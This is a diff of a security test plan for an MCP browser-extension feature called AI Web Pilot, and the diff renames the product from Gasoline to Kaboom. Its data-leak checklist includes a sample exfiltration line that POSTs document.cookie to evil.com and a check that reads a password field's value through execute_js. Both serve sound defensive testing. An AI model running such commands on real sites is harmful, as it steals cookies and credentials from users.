@@ -20,7 +20,7 @@ last_verified_date: 2026-03-05
 
 ## 1. Data Leak Analysis
 
-**Goal:** Verify the feature does NOT expose data it shouldn't. Gasoline runs on localhost and data must never leave the machine. AI Web Pilot is HIGH RISK because `execute_js` runs arbitrary JavaScript in page context, and `manage_state` serializes localStorage/sessionStorage/cookies.
+**Goal:** Verify the feature does NOT expose data it shouldn't. Kaboom runs on localhost and data must never leave the machine. AI Web Pilot is HIGH RISK because `execute_js` runs arbitrary JavaScript in page context, and `manage_state` serializes localStorage/sessionStorage/cookies.
 
 | # | Data Leak Risk | What to Check | Severity |
 |---|---------------|---------------|----------|
@@ -33,7 +33,7 @@ last_verified_date: 2026-03-05
 | DL-7 | `highlight_element` leaks DOM text content | Verify highlight response returns only `{ success, selector, bounds }` — no innerHTML, textContent, or attribute values | medium |
 | DL-8 | `execute_js` result serialization leaks prototype chain | Run script returning an object with a custom prototype; verify only own enumerable properties are serialized | medium |
 | DL-9 | `execute_js` reads password field values | Run `document.querySelector('input[type=password]').value` and confirm the value is returned (expected: yes, localhost-only) but flag if it could be logged | high |
-| DL-10 | State snapshots stored in chrome.storage.local are accessible by other extensions | Verify `gasoline_snapshots` namespace in chrome.storage.local is not readable by other extensions (Chrome enforces per-extension isolation) | medium |
+| DL-10 | State snapshots stored in chrome.storage.local are accessible by other extensions | Verify `kaboom_state_snapshots` namespace in chrome.storage.local is not readable by other extensions (Chrome enforces per-extension isolation) | medium |
 
 ### Negative Tests (must NOT leak)
 - [ ] `execute_js` result must NOT be written to any log file on disk (only returned via MCP stdio)
@@ -155,7 +155,7 @@ last_verified_date: 2026-03-05
 > Step-by-step verification for a human working with an AI assistant. The AI executes MCP tool calls; the human observes browser behavior and confirms results.
 
 ### Prerequisites
-- [ ] Gasoline server running: `./dist/gasoline --port 7890`
+- [ ] Kaboom server running: `./dist/kaboom --port 7890`
 - [ ] Chrome extension installed and connected (green indicator in popup)
 - [ ] AI Web Pilot toggle enabled in extension popup
 - [ ] A test page open in Chrome (e.g., localhost:3000 or any web page)
@@ -185,7 +185,7 @@ last_verified_date: 2026-03-05
 | # | Check | Method | Expected | Pass |
 |---|-------|--------|----------|------|
 | DL-UAT-1 | Execute_js cannot exfiltrate via fetch | Run `fetch('https://evil.com', {method:'POST', body: document.cookie})` via execute_js | Fetch blocked by CORS or returns network error; cookie data never leaves localhost | [ ] |
-| DL-UAT-2 | State snapshot stays local | Save state, then check `~/.gasoline/` directory and server HTTP endpoints for snapshot data | Snapshot is ONLY in chrome.storage.local; not on disk; not accessible via HTTP | [ ] |
+| DL-UAT-2 | State snapshot stays local | Save state, then check `~/.kaboom/` directory and server HTTP endpoints for snapshot data | Snapshot is ONLY in chrome.storage.local; not on disk; not accessible via HTTP | [ ] |
 | DL-UAT-3 | Highlight does not expose content | Highlight a sensitive element (e.g., a password field); check MCP response | Response contains only selector and bounds, not the field value | [ ] |
 
 ### Regression Checks
